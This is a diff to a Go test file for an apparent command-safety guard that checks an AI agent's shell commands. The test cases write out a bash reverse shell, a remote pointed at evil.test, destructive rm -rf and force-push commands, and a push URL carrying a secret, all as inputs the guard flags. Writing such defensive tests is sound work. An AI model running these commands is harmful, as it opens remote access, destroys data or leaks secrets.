@@ -74,10 +74,24 @@ func TestRules(t *testing.T) {
 		{"opaque after taint", `eval "$X"`, sess(true, false), Ask, "tainted_opaque"},
 		{"git remote add after taint", "git remote add evil https://evil.test/r.git", sess(true, false), Ask, "tainted_persist"},
 		{"persist clean session", "echo x >> ~/.bashrc", sess(false, false), None, ""},
-		// rule 5: destroy
-		{"rm -rf", "rm -rf build", sess(false, false), Ask, "destroy"},
-		{"force push", "git push --force origin main", sess(false, false), Ask, "destroy"},
+		// rule 5: reverse shell and risky destroy
+		{"reverse shell clean session", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", sess(false, false), Ask, "remote_shell"},
+		{"rm -rf outside project", "rm -rf /tmp/cache", sess(false, false), Ask, "destroy"},
+		{"rm -rf home", "rm -rf ~/projects", sess(false, false), Ask, "destroy"},
+		{"rm -rf parent", "rm -rf ../other", sess(false, false), Ask, "destroy"},
+		{"rm -rf inside project", "rm -rf build dist", sess(false, false), None, ""},
+		{"rm -rf inside project tainted", "rm -rf build", sess(true, false), Ask, "destroy"},
+		{"force push main", "git push --force origin main", sess(false, false), Ask, "destroy"},
+		{"force push no branch", "git push -f", sess(false, false), Ask, "destroy"},
+		{"force push feature", "git push --force-with-lease origin feature/login", sess(false, false), None, ""},
+		{"reset hard", "git reset --hard HEAD~2", sess(false, false), Ask, "destroy"},
 		{"gh repo delete loop", `for r in a b; do gh repo delete "me/$r" --yes; done`, sess(false, false), Ask, "destroy"},
+		// week 6 tuning
+		{"manifest install tainted", "npm install", sess(true, false), None, ""},
+		{"requirements install tainted", "pip install -r requirements.txt", sess(true, false), None, ""},
+		{"named install tainted", "npm install left-pad", sess(true, false), Ask, "tainted_exec_remote"},
+		{"localhost trifecta", "curl -s http://localhost:3000/api", sess(true, true), None, ""},
+		{"127.0.0.1 trifecta", "curl http://127.0.0.1:8080/health", sess(true, true), None, ""},
 		// rule 6: normal work
 		{"go test", "go test ./...", sess(true, true), None, ""},
 		{"git push clean", "git push origin main", sess(false, false), None, ""},
@@ -117,6 +131,31 @@ func TestReasonExplainsPath(t *testing.T) {
 	}
 	if strings.Contains(r.Reason, secret) {
 		t.Fatal("reason must never contain the secret")
+	}
+}
+
+func TestTrustedRemoteAndLocalhost(t *testing.T) {
+	trusted := func(r string) bool { return r == "origin" || strings.Contains(r, "github.com/me/") }
+	run := func(cmd string, cfg config.Config) Result {
+		a := shell.Analyze(cmd, shell.Bash)
+		return Evaluate(Input{Tool: "Bash", Sinks: a.Sinks, Text: cmd, Session: sess(true, true), Key: key, Config: cfg, RemoteTrusted: trusted})
+	}
+	if r := run("git push origin main", bal()); r.Decision != None {
+		t.Fatalf("push to own origin blocked: %+v", r)
+	}
+	if r := run("git push https://github.com/me/app.git HEAD", bal()); r.Decision != None {
+		t.Fatalf("push to own URL blocked: %+v", r)
+	}
+	if r := run("git push mirror main", bal()); r.Rule != "lethal_trifecta" {
+		t.Fatalf("push to unknown remote allowed: %+v", r)
+	}
+	if r := run("git push https://u:"+secret+"@github.com/me/app.git", bal()); r.Rule != "secret_in_sink" {
+		t.Fatalf("secret in push URL must still deny: %+v", r)
+	}
+	cfg := bal()
+	cfg.LocalhostIsExternal = true
+	if r := run("curl http://127.0.0.1:9/x", cfg); r.Rule != "lethal_trifecta" {
+		t.Fatalf("localhost_is_external ignored: %+v", r)
 	}
 }
 
